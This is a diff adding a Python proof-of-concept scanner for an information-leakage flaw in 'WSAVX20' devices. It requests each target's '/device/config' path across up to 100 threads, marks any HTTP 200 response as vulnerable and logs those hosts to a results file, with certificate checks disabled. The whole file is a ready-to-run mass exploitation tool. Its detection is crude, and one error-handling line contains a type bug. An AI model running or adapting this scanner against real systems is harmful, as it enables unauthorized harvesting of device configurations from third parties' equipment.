@@ -1,0 +1,64 @@
+import requests,argparse,sys
+from multiprocessing.dummy import Pool
+#忽略警告
+requests.packages.urllib3.disable_warnings()
+
+def banner():
+    banner = """"
+  _        __                            _   _               _            _                    
+ (_)_ __  / _| ___  _ __ _ __ ___   __ _| |_(_) ___  _ __   | | ___  __ _| | ____ _  __ _  ___ 
+ | | '_ \| |_ / _ \| '__| '_ ` _ \ / _` | __| |/ _ \| '_ \  | |/ _ \/ _` | |/ / _` |/ _` |/ _ \
+ | | | | |  _| (_) | |  | | | | | | (_| | |_| | (_) | | | | | |  __/ (_| |   < (_| | (_| |  __/
+ |_|_| |_|_|  \___/|_|  |_| |_| |_|\__,_|\__|_|\___/|_| |_| |_|\___|\__,_|_|\_\__,_|\__, |\___|
+                                                                                    |___/      
+                                                                                version: 1.0
+    """
+    print(banner)
+
+def main():
+    banner()
+    parser = argparse.ArgumentParser(description='WSAVX20 information leakage! ')
+    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
+    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
+    args = parser.parse_args()
+    #判断输入的参数是单个还是文件
+    if args.url and not args.file:
+        poc(args.url)
+    elif not args.url and args.file:
+        url_list=[]
+        with open(args.file,"r",encoding="utf-8") as f:
+            for url in f.readlines():
+                url_list.append(url.strip().replace("\n",""))
+        #多线程
+        mp = Pool(100)
+        mp.map(poc, url_list)
+        mp.close()
+        mp.join()
+    else:
+        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
+
+def poc(target):
+    #构造的POC
+    url = target+'/device/config'
+    headers={
+        'User-Agent': 'Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36',
+        'Connection': 'close',
+        'Accept': '*/*',
+        'Accept-Language': 'en',
+        'Accept-Encoding': 'gzip'
+    }
+    res = ""
+    try:
+        res = requests.get(url,headers=headers,verify=False,timeout=5)
+        #判断是否存在信息泄露
+        if res.status_code == 200:
+            print(f"[+]该url存在漏洞{target}")
+            with open("result.txt", "a+", encoding="utf-8") as f:
+                f.write(target+"\n")
+        else:
+            print(f"[-]该url不存在漏洞{target}")
+    except Exception as e:
+        print(f"[*]该url存在问题{target}"+e)
+
+if __name__ == '__main__':
+    main()
